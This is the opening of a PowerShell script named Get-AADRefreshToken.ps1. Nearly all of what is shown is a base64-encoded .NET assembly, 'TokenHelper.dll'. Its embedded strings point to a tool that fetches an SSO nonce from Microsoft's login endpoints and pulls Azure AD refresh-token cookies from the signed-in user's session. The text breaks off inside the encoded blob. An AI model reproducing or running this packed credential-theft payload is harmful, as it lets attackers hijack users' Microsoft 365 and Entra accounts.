# -----------------------------
# Get-AADRefreshToken.ps1
# -----------------------------
param()

# -----------------------------------------------------------------------
# Internal helpers - not exported
# -----------------------------------------------------------------------

function script:Load-TokenHelperAssembly {
    $encoded = @"
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ADxvZmZzZXQ+NV9fOQA8TW9kdWxlPgA8UHJpdmF0ZUltcGxlbWVudGF0aW9uRGV0YWlscz4AR2V0VHlwZUZyb21DTFNJRABnZXRfRGF0YQBzZXRfRGF0YQBtc2NvcmxpYgBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYwBnZXRfSWQAZ2V0X0N1cnJlbnRNYW5hZ2VkVGhyZWFkSWQAPD5sX19pbml0aWFsVGhyZWFkSWQAR2V0Q3VycmVudFRocmVhZElkAHRlbmFudElkAEFkZABHZXRJbnRlcmZhY2VHdWlkAEdldENsYXNzR3VpZAA8RGF0YT5rX19CYWNraW5nRmllbGQAPE5hbWU+a19fQmFja2luZ0ZpZWxkADxQM1BIZWFkZXI+a19fQmFja2luZ0ZpZWxkADxGbGFncz5rX19CYWNraW5nRmllbGQAQ3JlYXRlSW5zdGFuY2UARmV0Y2hOb25jZQBub25jZQBQcmludFVzYWdlAGdldF9NZXNzYWdlAElDb29raWVCcmlkZ2UATmF0aXZlVG9rZW5CcmlkZ2UASUVudW1lcmFibGUASURpc3Bvc2FibGUAUnVudGltZVR5cGVIYW5kbGUAR2V0VHlwZUZyb21IYW5kbGUAQ29uc29sZQBnZXRfTmFtZQBzZXRfTmFtZQBXcml0ZUxpbmUAQ29tSW50ZXJmYWNlVHlwZQBWYWx1ZVR5cGUAU3lzdGVtLkNvcmUAUHRyVG9TdHJ1Y3R1cmUAU3lzdGVtLklEaXNwb3NhYmxlLkRpc3Bvc2UARGVidWdnZXJCcm93c2FibGVTdGF0ZQA8PjFfX3N0YXRlAEVtYmVkZGVkQXR0cmlidXRlAENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUAQXR0cmlidXRlVXNhZ2VBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBEZWJ1Z2dlckJyb3dzYWJsZUF0dHJpYnV0ZQBJdGVyYXRvclN0YXRlTWFjaGluZUF0dHJpYnV0ZQBJbnRlcmZhY2VUeXBlQXR0cmlidXRlAERlYnVnZ2VySGlkZGVuQXR0cmlidXRlAFJlZlNhZmV0eVJ1bGVzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUARXhlY3V0ZQB2YWx1ZQBTaXplT2YASW5kZXhPZgBVcGxvYWRTdHJpbmcAU3Vic3RyaW5nAENvbXB1dGVTdHJpbmdIYXNoAGdldF9MZW5ndGgAUHRyVG9TdHJpbmdVbmkAQnVpbGRVcmkARmV0Y2hGb3JVcmkAPD4zX191cmkATWFyc2hhbABUb2tlbkhlbHBlci5JbnRlcm5hbABUb2tlbkhlbHBlci5kbGwARnJlZUNvVGFza01lbQBzZXRfSXRlbQBTeXN0ZW0ATWFpbgBBcHBEb21haW4AVmVyc2lvbgBXZWJIZWFkZXJDb2xsZWN0aW9uAE5vdFN1cHBvcnRlZEV4Y2VwdGlvbgBTdHJpbmdDb21wYXJpc29uAFJhd0Nvb2tpZUluZm8AU3lzdGVtLkxpbnEAZ2V0X1AzUEhlYWRlcgBzZXRfUDNQSGVhZGVyAEh0dHBSZXF1ZXN0SGVhZGVyAFJ1bm5lcgBOb25jZUhlbHBlcgBUb2tlbkhlbHBlcgBJRW51bWVyYXRvcgBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZTxUb2tlbkhlbHBlci5JbnRlcm5hbC5Db29raWVSZXN1bHQ+LkdldEVudW1lcmF0b3IAU3lzdGVtLkNvbGxlY3Rpb25zLklFbnVtZXJhYmxlLkdldEVudW1lcmF0b3IAQWN0aXZhdG9yAC5jdG9yAFAzUFB0cgBEYXRhUHRyAE5hbWVQdHIASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBHZXRDb29raWVzAGdldF9GbGFncwBzZXRfRmxhZ3MAYXJncwBNaWNyb3NvZnQuQ29kZUFuYWx5c2lzAFN5c3RlbS5Db2xsZWN0aW9ucwBnZXRfQ2hhcnMAZ2V0X0hlYWRlcnMAR2V0Q3VycmVudFByb2Nlc3MAQXR0cmlidXRlVGFyZ2V0cwBDb25jYXQARm9ybWF0AE9iamVjdABTeXN0ZW0uTmV0AFN5c3RlbS5Db2xsZWN0aW9ucy5JRW51bWVyYXRvci5SZXNldABDb29raWVSZXN1bHQAV2ViQ2xpZW50AEVudmlyb25tZW50AFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yPFRva2VuSGVscGVyLkludGVybmFsLkNvb2tpZVJlc3VsdD4uQ3VycmVudABTeXN0ZW0uQ29sbGVjdGlvbnMuSUVudW1lcmF0b3IuQ3VycmVudABTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYXRvcjxUb2tlbkhlbHBlci5JbnRlcm5hbC5Db29raWVSZXN1bHQ+LmdldF9DdXJyZW50AFN5c3RlbS5Db2xsZWN0aW9ucy5JRW51bWVyYXRvci5nZXRfQ3VycmVudAA8PjJfX2N1cnJlbnQAY291bnQAVG9MaXN0AG91dHB1dABNb3ZlTmV4dABBbnkARW50cnkAb3BfRXF1YWxpdHkASXNOdWxsT3JFbXB0eQAAEWgAdAB0AHAAcwA6AC8ALwAADWwAbwBnAGkAbgAuAAAfbQBpAGMAcgBvAHMAbwBmAHQAbwBuAGwAaQBuAGUAAAsuAGMAbwBtAC8AABsvAG8AYQB1AHQAaAAyAC8AdABvAGsAZQBuAAAxZwByAGEAbgB0AF8AdAB5AHAAZQA9AHMAcgB2AF8AYwBoAGEAbABsAGUAbgBnAGUAAENhAHAAcABsAGkAYwBhAHQAaQBvAG4ALwB4AC0AdwB3AHcALQBmAG8AcgBtAC0AdQByAGwAZQBuAGMAbwBkAGUAZAABLXAAeQB0AGgAbwBuAC0AcgBlAHEAdQBlAHMAdABzAC8AMgAuADIAOAAuADAAARMiAE4AbwBuAGMAZQAiADoAIgAAR04AbwBuAGMAZQAgAGYAaQBlAGwAZAAgAG4AbwB0ACAAZgBvAHUAbgBkACAAaQBuACAAcgBlAHMAcABvAG4AcwBlADoAIAAAAyIAADdNAGEAbABmAG8AcgBtAGUAZAAgAG4AbwBuAGMAZQAgAGkAbgAgAHIAZQBzAHAAbwBuAHMAZQAAL2MAbwBtAG0AbwBuAC8AbwBhAHUAdABoADIALwBhAHUAdABoAG8AcgBpAHoAZQAAFz8AYwBsAGkAZQBuAHQAXwBpAGQAPQAASTQANwA2ADUANAA0ADUAYgAtADMAMgBjADYALQA0ADkAYgAwAC0AOAAzAGUANgAtADEAZAA5ADMANwA2ADUAMgA3ADYAYwBhAAEfJgByAGUAcwBwAG8AbgBzAGUAXwB0AHkAcABlAD0AABtjAG8AZABlACsAaQBkAF8AdABvAGsAZQBuAAAPJgBzAGMAbwBwAGUAPQAAHW8AcABlAG4AaQBkACsAcAByAG8AZgBpAGwAZQAAHSYAcgBlAGQAaQByAGUAYwB0AF8AdQByAGkAPQAAP2gAdAB0AHAAcwAlADMAQQAlADIARgAlADIARgB3AHcAdwAuAG8AZgBmAGkAYwBlAC4AYwBvAG0AJQAyAEYAABcmAHMAcwBvAF8AbgBvAG4AYwBlAD0AAA1VAHMAYQBnAGUAOgAAayAAIABEAGUAZgBhAHUAbAB0ACAAKABhAHUAdABvACAAbgBvAG4AYwBlACkAOgAgACAAIABSAGUAcQB1AGUAcwB0AEEAQQBEAFIAZQBmAHIAZQBzAGgAVABvAGsAZQBuADIALgBlAHgAZQAAgIcgACAAQwB1AHMAdABvAG0AIAB0AGUAbgBhAG4AdAA6ACAAIAAgACAAIAAgACAAIAAgACAAUgBlAHEAdQBlAHMAdABBAEEARABSAGUAZgByAGUAcwBoAFQAbwBrAGUAbgAyAC4AZQB4AGUAIAAtAHQAIAA8AFQAZQBuAGEAbgB0AEkAZAA+AAGAiyAAIABNAGEAbgB1AGEAbAAgAG4AbwBuAGMAZQA6ACAAIAAgACAAIAAgACAAIAAgACAAIABSAGUAcQB1AGUAcwB0AEEAQQBEAFIAZQBmAHIAZQBzAGgAVABvAGsAZQBuADIALgBlAHgAZQAgAC0ALQBuAG8AbgBjAGUAIAA8AG4AbwBuAGMAZQA+AAGAnyAAIABGAHUAbABsACAAVQBSAEwAOgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABSAGUAcQB1AGUAcwB0AEEAQQBEAFIAZQBmAHIAZQBzAGgAVABvAGsAZQBuADIALgBlAHgAZQAgADwAZgB1AGwAbABfAHUAcgBsAF8AdwBpAHQAaABfAHMAcwBvAF8AbgBvAG4AYwBlAD4AAHsgACAATABlAGcAYQBjAHkAIAAoAG4AbwAgAG4AbwBuAGMAZQApADoAIAAgACAAIAAgACAAUgBlAHEAdQBlAHMAdABBAEEARABSAGUAZgBy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